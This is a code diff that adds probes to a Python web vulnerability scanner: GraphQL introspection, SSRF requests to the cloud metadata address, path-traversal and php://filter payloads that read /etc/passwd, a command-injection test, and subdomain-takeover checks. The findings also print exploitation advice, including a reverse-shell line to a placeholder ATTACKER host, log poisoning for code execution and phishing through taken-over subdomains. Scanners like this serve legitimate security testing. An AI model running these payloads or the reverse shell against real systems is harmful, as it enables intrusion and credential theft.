@@ -669,6 +669,10 @@ class VulnScanner:
             findings.extend(self._check_xss_reflection(base_url))
             findings.extend(self._check_directory_traversal(base_url))
             findings.extend(self._check_ssl_cert(base_url))
+            findings.extend(self._check_graphql_introspection(base_url))
+            findings.extend(self._check_ssrf_indicators(base_url))
+            findings.extend(self._check_lfi(base_url))
+            findings.extend(self._check_command_injection(base_url))
 
         return findings
 
@@ -1015,6 +1019,229 @@ class VulnScanner:
                             "evidence": f"Payload: {payload}, {desc} detected"
                         })
                         return findings
+        return findings
+
+    def _check_graphql_introspection(self, base_url: str) -> List[dict]:
+        """Check if GraphQL introspection is enabled (exposes full API schema)."""
+        findings = []
+        gql_paths = ["/graphql", "/graphql/", "/api/graphql", "/v1/graphql"]
+        introspection_query = {"query": '{ __schema { types { name } } }'}
+
+        for gql_path in gql_paths:
+            if shutdown_requested():
+                break
+            url = urljoin(base_url, gql_path)
+            try:
+                resp = self._session._session.post(
+                    url, json=introspection_query, timeout=15,
+                    proxies=self._session._proxy, headers=_pick_profile()
+                )
+                if resp and resp.status_code == 200:
+                    try:
+                        data = resp.json()
+                        if data.get("data", {}).get("__schema"):
+                            types = data["data"]["__schema"].get("types", [])
+                            type_names = [t.get("name", "") for t in types[:10]]
+                            findings.append({
+                                "severity": SEV_HIGH,
+                                "title": f"GraphQL introspection enabled at {gql_path}",
+                                "detail": "Full API schema exposed. Attacker can discover all "
+                                          "queries, mutations, types, and fields — then craft "
+                                          "targeted queries to extract sensitive data.",
+                                "evidence": f"Schema returned {len(types)} types: {', '.join(type_names[:5])}...",
+                                "exploitable": True,
+                                "exploit_info": {
+                                    "type": "graphql_introspection",
+                                    "path": gql_path,
+                                    "method": "POST introspection query to enumerate full schema, "
+                                              "then query for sensitive types (User, Account, Order, etc.)",
+                                    "risk": "Data exfiltration of all API-accessible data",
+                                },
+                            })
+                            return findings
+                    except (ValueError, KeyError):
+                        pass
+            except Exception:
+                pass
+        return findings
+
+    def _check_ssrf_indicators(self, base_url: str) -> List[dict]:
+        """Check for SSRF (Server-Side Request Forgery) indicators."""
+        findings = []
+        ssrf_params = ["url", "uri", "src", "source", "href", "link",
+                       "img", "image", "fetch", "load", "proxy"]
+        # We use a unique callback canary — if the server fetches it, SSRF exists.
+        # Since we can't host a listener through Tor easily, we check for error
+        # responses that reveal the server tried to fetch the URL.
+        canary_url = "http://169.254.169.254/latest/meta-data/"  # AWS metadata
+
+        for param in ssrf_params[:5]:
+            if shutdown_requested():
+                break
+            test_url = f"{base_url}?{param}={quote(canary_url)}"
+            resp = self._session.get(test_url, allow_wayback=False)
+            if resp and resp.text:
+                # Check if AWS metadata content appears in response
+                aws_indicators = [
+                    "ami-id", "instance-id", "instance-type",
+                    "local-hostname", "public-hostname", "security-credentials",
+                    "iam", "meta-data",
+                ]
+                text_lower = resp.text.lower()
+                matched = [ind for ind in aws_indicators if ind in text_lower]
+                if len(matched) >= 2:
+                    findings.append({
+                        "severity": SEV_CRITICAL,
+                        "title": f"SSRF via '{param}' parameter — AWS metadata accessible",
+                        "detail": "Server fetches attacker-supplied URLs internally. "
+                                  "AWS instance metadata (credentials, keys) is readable.",
+                        "evidence": f"Parameter: {param}, AWS indicators: {', '.join(matched[:3])}",
+                        "exploitable": True,
+                        "exploit_info": {
+                            "type": "ssrf",
+                            "parameter": param,
+                            "method": f"Supply internal URLs via '{param}' parameter. "
+                                      "Target: http://169.254.169.254/ for cloud credentials, "
+                                      "http://127.0.0.1:<port>/ for internal services.",
+                            "risk": "Cloud credential theft, internal network access",
+                        },
+                    })
+                    return findings
+        return findings
+
+    def _check_lfi(self, base_url: str) -> List[dict]:
+        """Check for Local File Inclusion (LFI) vulnerabilities."""
+        findings = []
+        lfi_params = ["page", "file", "include", "template", "path", "doc", "view"]
+        lfi_payloads = [
+            ("..%2F..%2F..%2F..%2Fetc%2Fpasswd", "etc/passwd via URL encoding"),
+            ("....//....//....//....//etc/passwd", "etc/passwd via double-dot bypass"),
+            ("/etc/passwd", "etc/passwd direct path"),
+            ("php://filter/convert.base64-encode/resource=index.php",
+             "PHP filter wrapper — reads source code as base64"),
+        ]
+        passwd_indicators = [
+            re.compile(r"root:.*:0:0:"),
+            re.compile(r"daemon:.*:/usr/sbin"),
+            re.compile(r"www-data:"),
+        ]
+
+        for param in lfi_params[:3]:
+            for payload, desc in lfi_payloads[:2]:
+                if shutdown_requested():
+                    return findings
+                test_url = f"{base_url}?{param}={payload}"
+                resp = self._session.get(test_url, allow_wayback=False)
+                if resp and resp.text:
+                    for ind in passwd_indicators:
+                        if ind.search(resp.text[:3000]):
+                            findings.append({
+                                "severity": SEV_CRITICAL,
+                                "title": f"Local File Inclusion via '{param}' parameter",
+                                "detail": "Arbitrary local files readable through the web server. "
+                                          "Attacker can read /etc/passwd, config files, source code, "
+                                          "and potentially achieve RCE via log poisoning.",
+                                "evidence": f"Parameter: {param}, payload: {desc}",
+                                "exploitable": True,
+                                "exploit_info": {
+                                    "type": "lfi",
+                                    "parameter": param,
+                                    "method": f"Supply file paths via '{param}'. "
+                                              "Read sensitive files: /etc/passwd, /etc/shadow (if readable), "
+                                              "application config files, database credentials. "
+                                              "For RCE: poison access logs then include them.",
+                                    "risk": "Full file system read, potential remote code execution",
+                                },
+                            })
+                            return findings
+        return findings
+
+    def _check_command_injection(self, base_url: str) -> List[dict]:
+        """Check for OS command injection indicators."""
+        findings = []
+        cmd_params = ["cmd", "exec", "command", "ping", "host", "ip", "query"]
+        # Use a time-based detection: if sleep(5) makes the response 5s slower,
+        # command injection exists. Canary: semicolon + sleep.
+        # We also check for direct output of common commands.
+
+        for param in cmd_params[:3]:
+            if shutdown_requested():
+                return findings
+            # Test 1: try to echo a unique marker
+            marker = f"gs{secrets.token_hex(4)}rce"
+            # URL-encode the payload: ;echo <marker>
+            payload = f";echo {marker}"
+            test_url = f"{base_url}?{param}={quote(payload)}"
+            resp = self._session.get(test_url, allow_wayback=False)
+            if resp and marker in resp.text:
+                findings.append({
+                    "severity": SEV_CRITICAL,
+                    "title": f"OS Command Injection via '{param}' parameter",
+                    "detail": "Arbitrary OS commands execute on the server. "
+                              "Full system compromise possible.",
+                    "evidence": f"Parameter: {param}, echo marker reflected in response",
+                    "exploitable": True,
+                    "exploit_info": {
+                        "type": "command_injection",
+                        "parameter": param,
+                        "method": f"Inject OS commands via '{param}' parameter. "
+                                  "Use: ;command or |command or $(command). "
+                                  "For reverse shell: ;bash -i >& /dev/tcp/ATTACKER/PORT 0>&1",
+                        "risk": "Full system compromise, data exfiltration, lateral movement",
+                    },
+                })
+                return findings
+        return findings
+
+    def _check_subdomain_takeover(self, domain: str, cnames: List[str]) -> List[dict]:
+        """Check for subdomain takeover via dangling CNAME records."""
+        findings = []
+        # Services that are commonly vulnerable to takeover when CNAME exists
+        # but the resource is unclaimed
+        takeover_fingerprints = {
+            "github.io": ("GitHub Pages", "There isn't a GitHub Pages site here"),
+            "herokuapp.com": ("Heroku", "no-such-app"),
+            "s3.amazonaws.com": ("AWS S3", "NoSuchBucket"),
+            "azurewebsites.net": ("Azure", "404 Web Site not found"),
+            "cloudfront.net": ("CloudFront", "The request could not be satisfied"),
+            "shopify.com": ("Shopify", "Sorry, this shop is currently unavailable"),
+            "fastly.net": ("Fastly", "Fastly error: unknown domain"),
+            "ghost.io": ("Ghost", "The thing you were looking for is no longer here"),
+            "surge.sh": ("Surge", "project not found"),
+            "bitbucket.io": ("Bitbucket", "Repository not found"),
+        }
+
+        for cname in cnames:
+            cname_lower = cname.lower().rstrip(".")
+            for service_domain, (service_name, fingerprint) in takeover_fingerprints.items():
+                if cname_lower.endswith(service_domain):
+                    # Verify: try to access the subdomain and check for takeover fingerprint
+                    for scheme in ["https", "http"]:
+                        try:
+                            resp = self._session.get(f"{scheme}://{domain}", allow_wayback=False)
+                            if resp and fingerprint.lower() in resp.text.lower():
+                                findings.append({
+                                    "severity": SEV_HIGH,
+                                    "title": f"Subdomain takeover possible via {service_name}",
+                                    "detail": f"CNAME points to {cname_lower} but the {service_name} "
+                                              f"resource is unclaimed. An attacker can claim it and "
+                                              f"serve arbitrary content on {domain}.",
+                                    "evidence": f"CNAME: {cname_lower}, fingerprint: '{fingerprint[:40]}'",
+                                    "exploitable": True,
+                                    "exploit_info": {
+                                        "type": "subdomain_takeover",
+                                        "service": service_name,
+                                        "cname": cname_lower,
+                                        "method": f"Register the unclaimed resource on {service_name} "
+                                                  f"to take control of {domain}. "
+                                                  f"Then serve phishing pages, steal cookies, or "
+                                                  f"bypass CSP/CORS restrictions.",
+                                        "risk": "Phishing, cookie theft, CSP bypass",
+                                    },
+                                })
+                                return findings
+                        except Exception:
+                            pass
         return findings
 
     def _check_ssl_cert(self, base_url: str) -> List[dict]:
@@ -1441,6 +1668,20 @@ class IntelOrchestrator:
                 self._results.append({"type": "subdomains", "domain": domain,
                                       "subdomains": subs, "count": len(subs)})
 
+                # Check for subdomain takeover on subdomains that have CNAME records
+                print(f"\n  [*] Phase 5b: Checking subdomains for takeover...")
+                for sub in subs[:10]:
+                    if shutdown_requested():
+                        break
+                    sub_dns = self._dns.lookup(sub)
+                    cnames = sub_dns.get("CNAME", [])
+                    if cnames:
+                        takeover = self._vulns._check_subdomain_takeover(sub, cnames)
+                        if takeover:
+                            self._vuln_findings.extend(takeover)
+                            for t in takeover:
+                                print(f"  [!] TAKEOVER: {t['title']}")
+
         # Phase 6: Search for additional intel
         print(f"\n  [*] Phase 6: Search engine OSINT...")
         dork_queries = [f'site:{domain}', f'"{domain}" filetype:pdf']
@@ -1555,15 +1796,24 @@ class IntelOrchestrator:
               f"{counts.get(SEV_CRITICAL,0)} critical, {counts.get(SEV_HIGH,0)} high, "
               f"{counts.get(SEV_MEDIUM,0)} medium, {counts.get(SEV_LOW,0)} low, "
               f"{counts.get(SEV_INFO,0)} info")
+        exploitable_count = sum(1 for v in vulns if v.get("exploitable"))
+        if exploitable_count:
+            print(f"  [!] {exploitable_count} EXPLOITABLE vulnerabilities found!")
+
         for v in vulns:
             sev = v["severity"]
             color = {"CRITICAL": "\033[1;31m", "HIGH": "\033[0;31m",
                      "MEDIUM": "\033[1;33m", "LOW": "\033[0;36m",
                      "INFO": "\033[0;90m"}.get(sev, "")
             reset = "\033[0m"
-            print(f"  {color}[{sev}]{reset} {v['title']}")
+            exploit_tag = " [EXPLOITABLE]" if v.get("exploitable") else ""
+            print(f"  {color}[{sev}]{reset} {v['title']}{exploit_tag}")
             if sev in (SEV_CRITICAL, SEV_HIGH):
                 print(f"         {v['detail'][:120]}")
+            if v.get("exploit_info"):
+                ei = v["exploit_info"]
+                print(f"         Exploit: {ei.get('method', '')[:100]}")
+                print(f"         Risk: {ei.get('risk', '')[:80]}")
 
     def _print_dns(self, records: dict):
         if not records:
